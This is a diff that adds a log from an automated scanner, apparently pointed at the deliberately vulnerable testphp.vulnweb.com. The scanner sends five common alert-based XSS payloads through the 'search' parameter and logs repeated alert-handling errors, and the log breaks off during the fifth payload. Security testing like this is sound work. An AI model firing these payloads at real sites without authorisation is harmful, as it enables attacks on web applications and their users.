@@ -1,0 +1,67 @@
+2025-09-21 19:56:04,822 - INFO - [92m[SELENIUM] WebDriver initialized with system ChromeDriver[0m
+2025-09-21 19:56:04,822 - INFO - [94m[XSS] Scanning 1 URLs...[0m
+2025-09-21 19:56:04,823 - INFO - [96m[URL] Testing URL: http://testphp.vulnweb.com[0m
+2025-09-21 19:56:04,823 - INFO - [94m[WAF] Detecting WAF presence...[0m
+2025-09-21 19:56:04,823 - INFO - [96m[WAF] WAF detected: False[0m
+2025-09-21 19:56:04,980 - INFO - [92m[PAYLOAD] No WAF detected - using simple payloads only[0m
+2025-09-21 19:56:04,980 - INFO - [96m[PARAM] Testing parameter: search (context: html, WAF: False)[0m
+2025-09-21 19:56:04,980 - INFO - [96m[PAYLOADS] Testing 5 payloads[0m
+2025-09-21 19:56:04,980 - INFO - [96m[PAYLOAD 1/5] <script>alert("XSS")</script>[0m
+2025-09-21 19:56:04,980 - INFO - [96m[XSS] Testing: http://testphp.vulnweb.com?search=%3Cscript%3Ealert%28%22ULTIMATE_XSS_30606%22%29%3C%2Fscript%3E[0m
+2025-09-21 19:56:04,980 - INFO - [96m[PAYLOAD] <script>alert("XSS")</script>[0m
+2025-09-21 19:56:11,032 - WARNING - [93m[XSS] Alert handling error (attempt 1): Message: 
+[0m
+2025-09-21 19:56:12,546 - WARNING - [93m[XSS] Alert handling error (attempt 2): Message: 
+[0m
+2025-09-21 19:56:14,060 - WARNING - [93m[XSS] Alert handling error (attempt 3): Message: 
+[0m
+2025-09-21 19:56:15,573 - WARNING - [93m[XSS] Alert handling error (attempt 4): Message: 
+[0m
+2025-09-21 19:56:17,086 - WARNING - [93m[XSS] Alert handling error (attempt 5): Message: 
+[0m
+2025-09-21 19:56:17,591 - INFO - [96m[PAYLOAD 2/5] <img src=x onerror=alert("XSS")>[0m
+2025-09-21 19:56:17,591 - INFO - [96m[XSS] Testing: http://testphp.vulnweb.com?search=%3Cimg+src%3Dx+onerror%3Dalert%28%22ULTIMATE_XSS_30606%22%29%3E[0m
+2025-09-21 19:56:17,591 - INFO - [96m[PAYLOAD] <img src=x onerror=alert("XSS")>[0m
+2025-09-21 19:56:23,632 - WARNING - [93m[XSS] Alert handling error (attempt 1): Message: 
+[0m
+2025-09-21 19:56:25,144 - WARNING - [93m[XSS] Alert handling error (attempt 2): Message: 
+[0m
+2025-09-21 19:56:26,656 - WARNING - [93m[XSS] Alert handling error (attempt 3): Message: 
+[0m
+2025-09-21 19:56:28,167 - WARNING - [93m[XSS] Alert handling error (attempt 4): Message: 
+[0m
+2025-09-21 19:56:29,682 - WARNING - [93m[XSS] Alert handling error (attempt 5): Message: 
+[0m
+2025-09-21 19:56:30,186 - INFO - [96m[PAYLOAD 3/5] <svg onload=alert("XSS")>[0m
+2025-09-21 19:56:30,186 - INFO - [96m[XSS] Testing: http://testphp.vulnweb.com?search=%3Csvg+onload%3Dalert%28%22ULTIMATE_XSS_30606%22%29%3E[0m
+2025-09-21 19:56:30,187 - INFO - [96m[PAYLOAD] <svg onload=alert("XSS")>[0m
+2025-09-21 19:56:36,235 - WARNING - [93m[XSS] Alert handling error (attempt 1): Message: 
+[0m
+2025-09-21 19:56:37,748 - WARNING - [93m[XSS] Alert handling error (attempt 2): Message: 
+[0m
+2025-09-21 19:56:39,260 - WARNING - [93m[XSS] Alert handling error (attempt 3): Message: 
+[0m
+2025-09-21 19:56:40,772 - WARNING - [93m[XSS] Alert handling error (attempt 4): Message: 
+[0m
+2025-09-21 19:56:42,285 - WARNING - [93m[XSS] Alert handling error (attempt 5): Message: 
+[0m
+2025-09-21 19:56:42,793 - INFO - [96m[PAYLOAD 4/5] <iframe src="javascript:alert('XSS')">[0m
+2025-09-21 19:56:42,793 - INFO - [96m[XSS] Testing: http://testphp.vulnweb.com?search=%3Ciframe+src%3D%22javascript%3Aalert%28%27ULTIMATE_XSS_30606%27%29%22%3E[0m
+2025-09-21 19:56:42,793 - INFO - [96m[PAYLOAD] <iframe src="javascript:alert('XSS')">[0m
+2025-09-21 19:56:48,837 - WARNING - [93m[XSS] Alert handling error (attempt 1): Message: 
+[0m
+2025-09-21 19:56:50,351 - WARNING - [93m[XSS] Alert handling error (attempt 2): Message: 
+[0m
+2025-09-21 19:56:51,864 - WARNING - [93m[XSS] Alert handling error (attempt 3): Message: 
+[0m
+2025-09-21 19:56:53,375 - WARNING - [93m[XSS] Alert handling error (attempt 4): Message: 
+[0m
+2025-09-21 19:56:54,888 - WARNING - [93m[XSS] Alert handling error (attempt 5): Message: 
+[0m
+2025-09-21 19:56:55,393 - INFO - [96m[PAYLOAD 5/5] <body onload=alert("XSS")>[0m
+2025-09-21 19:56:55,393 - INFO - [96m[XSS] Testing: http://testphp.vulnweb.com?search=%3Cbody+onload%3Dalert%28%22ULTIMATE_XSS_30606%22%29%3E[0m
+2025-09-21 19:56:55,393 - INFO - [96m[PAYLOAD] <body onload=alert("XSS")>[0m
+2025-09-21 19:57:01,440 - WARNING - [93m[XSS] Alert handling error (attempt 1): Message: 
+[0m
+2025-09-21 19:57:02,952 - WARNING - [93m[XSS] Alert handling error (attempt 2): Message: 
+[0m
